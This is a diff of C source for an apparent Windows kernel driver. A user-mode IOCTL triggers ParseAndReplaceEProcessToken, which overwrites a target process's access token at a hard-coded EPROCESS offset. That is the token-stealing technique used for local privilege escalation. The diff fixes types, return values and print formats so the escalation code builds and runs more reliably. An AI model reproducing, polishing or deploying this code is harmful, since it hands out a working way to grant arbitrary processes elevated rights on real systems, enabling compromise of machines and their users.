@@ -33,14 +33,11 @@ char* PsGetProcessImageFileName(PEPROCESS Process);
 //
 // Executive Fast Reference Structure
 //
-typedef struct _EX_FAST_REF
+typedef union _EX_FAST_REF
 {
-    union
-    {
-        PVOID Object;
-        ULONG_PTR RefCnt : 3;
-        ULONG_PTR Value;
-    };
+    PVOID Object;
+    ULONG_PTR RefCnt : 3;
+    ULONG_PTR Value;
 } EX_FAST_REF, * PEX_FAST_REF;
 
 void FASTCALL ObReferenceObjectEx(LPVOID Object, int Count)
@@ -141,7 +138,9 @@ ParseAndReplaceEProcessToken(
     HANDLE SourceToken
 )
 {
-    PVOID process = NULL;
+    UNREFERENCED_PARAMETER(SourcePid);
+
+    PEPROCESS process = NULL;
     //PVOID sys = NULL;
     PACCESS_TOKEN TargetToken;
     //PACCESS_TOKEN sysToken;
@@ -199,7 +198,7 @@ ParseAndReplaceEProcessToken(
             ObDereferenceObject(process);
             return (-1);
         }
-        DbgPrint("%s token : %x\n", ImageName, TargetToken);
+        DbgPrint("%s token : %p\n", ImageName, TargetToken);
 
         //sysToken = PsReferencePrimaryToken(sys);
         //if (!sysToken)
@@ -214,10 +213,7 @@ ParseAndReplaceEProcessToken(
 
         ULONG_PTR UniqueProcessIdAddress = (ULONG_PTR)process + 0x4b8;
 
-        DbgPrint("%s token address  %x\n", ImageName, UniqueProcessIdAddress);
-
-        unsigned long long  UniqueProcessId = *(PHANDLE)UniqueProcessIdAddress;
-
+        DbgPrint("%s token address  %llx\n", ImageName, UniqueProcessIdAddress);
 
         //ULONG_PTR sysadd = (ULONG_PTR)sys + 0x4b8;
 
@@ -227,11 +223,11 @@ ParseAndReplaceEProcessToken(
 
         *(PHANDLE)UniqueProcessIdAddress = NewValue.Object;
 
-        DbgPrint("process %s Token updated to  :%x ", ImageName, *(PHANDLE)(UniqueProcessIdAddress));
+        DbgPrint("process %s Token updated to  :%p ", ImageName, *(PHANDLE)(UniqueProcessIdAddress));
 
-        for (int i = 1; i < 8; i++)
+        for (int i = 0; i < 8; i++)
         {
-            unsigned char f = *(PHANDLE)(UniqueProcessIdAddress + i);
+            unsigned char f = *(unsigned char *)(UniqueProcessIdAddress + i);
             DbgPrint(" %x ", f);
         }
 
@@ -266,6 +262,8 @@ NTSTATUS processIoctlRequest(
     IRP* Irp
 )
 {
+    UNREFERENCED_PARAMETER(DeviceObject);
+
     PIO_STACK_LOCATION  pstack = IoGetCurrentIrpStackLocation(Irp);
     int pstatus = 0;
     if (pstack->Parameters.DeviceIoControl.IoControlCode == ppid)
@@ -281,16 +279,25 @@ NTSTATUS processIoctlRequest(
     Irp->IoStatus.Status = 0;
     Irp->IoStatus.Information = sizeof(int);
     IoCompleteRequest(Irp, IO_NO_INCREMENT);
+
+    return 0;
 }
 
-void IRP_MJCreate()
+NTSTATUS IRP_MJCreate(DEVICE_OBJECT* DeviceObject,
+    IRP* Irp)
 {
+    UNREFERENCED_PARAMETER(DeviceObject);
+    UNREFERENCED_PARAMETER(Irp);
     DbgPrint("IRP_CREATED\n");
-
+    return 0;
 }
-void IRP_MJClose()
+NTSTATUS IRP_MJClose(DEVICE_OBJECT* DeviceObject,
+    IRP* Irp)
 {
+    UNREFERENCED_PARAMETER(DeviceObject);
+    UNREFERENCED_PARAMETER(Irp);
     DbgPrint("IRP_Closed\n");
+    return 0;
 
 }
 NTSTATUS
